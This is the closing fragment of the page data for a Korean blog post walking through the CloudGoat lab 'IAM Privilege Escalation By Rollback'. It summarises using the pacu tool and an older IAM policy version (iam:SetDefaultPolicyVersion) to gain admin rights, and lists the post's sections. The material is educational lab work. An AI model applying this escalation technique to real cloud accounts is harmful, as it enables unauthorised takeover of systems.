srcset=\"/static/7058281f09060b29aab79cbe993142e2/e9ff0/10.png 180w,\n/static/7058281f09060b29aab79cbe993142e2/f21e7/10.png 360w,\n/static/7058281f09060b29aab79cbe993142e2/37523/10.png 720w,\n/static/7058281f09060b29aab79cbe993142e2/1cfc2/10.png 900w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>위 단계에서 차례대로 취약한 버전 정보를 도출하였고 해당 정책으로 부터 권한 상승이 가능하지 <code class=\"language-text\">pacu</code> 도구를 사용하여 <code class=\"language-text\">iam__enum_permissions</code> 모듈을 사용하여 권한 상승을 성공적으로 수행하였습니다.</li>\n<li>현재 이미 admin 권한을 획득한 것을 확인할 수 있습니다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\">시나리오 환경 설정</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">Exploit 흐름도</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#iam-user-raynor-%EC%82%AC%EC%9A%A9-%EA%B0%80%EB%8A%A5%ED%95%9C-%EA%B6%8C%ED%95%9C-%EC%97%B4%EA%B1%B0\">IAM User: Raynor 사용 가능한 권한 열거</a></li>\n<li><a href=\"#raynor-%EC%9D%B4%EC%A0%84-%EB%B2%84%EC%A0%84%EC%9D%98-iam-policies\">Raynor 이전 버전의 IAM policies</a></li>\n<li><a href=\"#iamsetdefaultpolicyversion-%EA%B6%8C%ED%95%9C%EC%9D%B4-%EC%99%9C-%EB%B3%B4%EC%95%88-%EB%AC%B8%EC%A0%9C%EC%9D%BC%EA%B9%8C\">iam:SetDefaultPolicyVersion 권한이 왜 보안 문제일까?</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%B2%84%EC%A0%84\">취약한 정책 버전</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 2 (CloudGoat: IAM Privilege Escalation By Rollback)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-2/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/cloud-service-vuln-1/","nextSlug":"/cloud-service-vuln-4/","prevSlug":"/cloud-service-vuln-2/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}